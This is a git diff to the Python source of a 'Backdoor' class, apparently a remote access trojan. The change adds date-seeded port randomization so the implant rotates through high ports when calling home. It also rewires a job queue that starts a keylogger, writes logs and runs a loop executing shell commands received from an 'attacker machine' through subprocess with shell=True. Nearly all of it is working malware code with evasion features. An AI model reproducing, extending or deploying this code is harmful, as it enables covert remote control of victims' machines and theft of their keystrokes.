@@ -14,17 +14,26 @@ import base64
 import subprocess
 import threading
 import json
+import datetime
+import random
 
 # User Defined Modules
 from Logger import Logger
 
 
 class Backdoor:
-    NUMBER_OF_THREADS = 4
-    JOB_NUMBER = [1, 2, 3]
-    queue = Queue()
+    NUMBER_OF_THREADS = 5
+    JOB_NUMBER = [0, 3, 4, 6]
     Ip = "127.0.0.1"
-    Port = 4444
+    NUMBER_OF_PORTS = 5
+    MAX_PORT_VALUE = 65535
+    MIN_PORT_VALUE = 49152
+
+    is_date_changed = False
+
+    port_list = []
+
+    queue = Queue()
 
     # Initialize the socket connection via constructor with the given ip and port value
     def __init__(self):
@@ -49,21 +58,23 @@ class Backdoor:
         while True:
             x = self.queue.get()
 
-            if x == 1:
-                try:
-                    self.connect_to_server(self.Ip, self.Port)
-                    self.queue.put(0)
-                except Exception as msg:
-                    print(msg)
+            if x == 0:
+                self.randomize_ports()
 
-            elif x == 0:
-                self.run()
+            elif x == 1:
+                self.connect_to_server()
 
             elif x == 2:
-                self.logger.key_logger()
+                self.command_executor()
 
             elif x == 3:
+                self.logger.key_logger()
+
+            elif x == 4:
                 self.logger.write_file()
+
+            elif x == 6:
+                self.check_date()
 
             elif x == 7:
                 self.logger.track_event()
@@ -77,29 +88,64 @@ class Backdoor:
 
     # ****************** THREAD POOL ******************************************************************
 
-    def connect_to_server(self, ip, port):
+    def randomize_ports(self):
 
-        # TODO Listen Multiple Ports / Change Ports
+        date_time = datetime.datetime.now()
+        current_day = date_time.day
+        step = (self.MAX_PORT_VALUE - self.MIN_PORT_VALUE) / self.NUMBER_OF_PORTS
+        random.seed(current_day)
+        seed = random.random()
+        self.port_list = []
+
+        for i in range(5):
+            self.port_list.append(round(self.MIN_PORT_VALUE + step * i + step * seed))
+
+        self.queue.put(1)
+
+    def check_date(self):
+
+        last_time = datetime.datetime.now()
+        last_day = last_time.day
+
+        while True:
+
+            new_time = datetime.datetime.now()
+            current_day = new_time.day
+
+            if last_day != current_day:
+                last_day = current_day
+                self.is_date_changed = True
+                self.queue.put(0)
+
+            time.sleep(60)
+            self.is_date_changed = False
+
+    def connect_to_server(self):
 
         succeeded = False
         retry_interval = 5
+        index = 0
 
-        while succeeded is False:
+        while succeeded is False and self.is_date_changed is False:
 
             try:
                 # TCP Connection
                 self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.connection.connect((ip, port))
+                self.connection.connect((self.Ip, self.port_list[index]))
                 succeeded = True
-                print("Connected!")
+                self.queue.put(2)
+                print("Connected to port {}".format(self.port_list[index]))
             except Exception as msg:
-                print("An attempt to connect server has failed " + str(msg))
+                print("An attempt to connect server ( port: {} ) has failed ".format(self.port_list[index]) + str(msg))
                 print("Will Retry in {} seconds".format(retry_interval))
+                index = (index + 1) % self.NUMBER_OF_PORTS
                 time.sleep(retry_interval)
 
     # Execute given command string in shell
-    def execute_system_command(self, command):
-        command = "".join(command)
+    def execute_system_command(self, command: list):
+
+        command = " ".join(command)
+
         task = subprocess.Popen(args=command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
         stdout, stderr = task.communicate()
@@ -142,7 +188,7 @@ class Backdoor:
             return "[+] Upload successful"
 
     # Here we are waiting commands from attacker machine in an infinite loop
-    def run(self):
+    def command_executor(self):
 
         while True:
 
@@ -162,7 +208,7 @@ class Backdoor:
                     if len(command) > 1:
                         command_result = self.__change_working_directory_to(command[1])
                     else:
-                        command_result = self.execute_system_command(command[0])
+                        command_result = self.execute_system_command(command)
                     self.__send_data(command_result)
 
                 except Exception as e:
